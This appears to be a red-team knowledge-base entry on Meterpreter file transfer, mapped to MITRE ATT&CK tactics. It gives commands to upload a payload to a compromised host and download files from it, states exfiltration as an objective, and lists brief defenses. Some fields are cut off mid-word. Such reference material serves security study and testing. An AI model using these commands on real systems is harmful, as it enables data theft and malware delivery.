---
id: fb4dd4f3-e9f7-45a0-a9d8-239ee4ebe6f9
name: Meterpreter File Transfer
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.484255+00:00'
updated_at: '2023-04-10T20:25:02.185552+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Data Compressed|T1002 - Data Compressed]]'
- '[[Data Encrypted|T1022 - Data Encrypted]]'
- '[[File and Directory Discovery|T1083 - File and Directory Discovery]]'
tags:
- '[[Metasploit]]'
- '[[Meterpreter - Basic]]'
- '[[Upload / Download]]'
commands:
- '[[Download from victim]]'
- '[[Upload payload.exe as exploit.exe]]'
---

# Meterpreter File Transfer

## Summary

The Meterpreter File Transfer module allows an attacker to upload or download files to and from a compromised host using the Meterpreter session. This can be useful for exfiltrating sensitive data or for delivering additional payloads to the target system. The module supports both uploading and dow

## Description

# Description

The Meterpreter File Transfer module allows an attacker to upload or download files to and from a compromised host using the Meterpreter session. This can be useful for exfiltrating sensitive data or for delivering additional payloads to the target system. The module supports both uploading and downloading files, as well as creating directories on the target system. The files can be compressed and encrypted to avoid detection by security controls.

 

## Requirements

1. A Meterpreter session on the target system.

 

## Defense

1. Implement network segmentation to limit the attacker's access to sensitive systems.

1. Implement file integrity monitoring to detect any unauthorized file transfers.

1. Implement endpoint detection and response solutions to detect and respond to any malicious activity on the system.

 

## Objectives

1. Exfiltrate sensitive data from the target system.

1. Deliver additional payloads to the target system.

 

# Instructions

1. To transfer files between the attacker and victim machines, use the following commands:

- 'upload /path/in/hdd/payload.exe exploit.exe': This command uploads the file 'payload.exe' from the attacker's machine to the victim's machine and saves it as 'exploit.exe'.

- 'download /path/in/victim': This command downloads a file from the victim's machine to the attacker's machine. Replace '/path/in/victim' with the path of the file you want to download.

 



**Code**: [[upload /path/in/hdd/payload.exe exploit.exe
downlo]]



> The 'upload' command takes two arguments: the path of the file on the attacker's machine and the name to save the file as on the victim's machine. The 'download' command takes one argument: the path of the file on the victim's machine that you want to download. Make sure to replace the paths and file names with the correct ones for your specific use case.



**Command** ([[Upload payload.exe as exploit.exe]]):

```bash
upload /path/in/hdd/payload.exe exploit.exe
```





**Command** ([[Download from victim]]):

```bash
download /path/in/victim
```



## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Data Compressed|T1002 - Data Compressed]]
- [[Data Encrypted|T1022 - Data Encrypted]]
- [[File and Directory Discovery|T1083 - File and Directory Discovery]]

## Commands Used

- [[Download from victim]]
- [[Upload payload.exe as exploit.exe]]

## Tags

- [[Metasploit]]
- [[Meterpreter - Basic]]
- [[Upload / Download]]


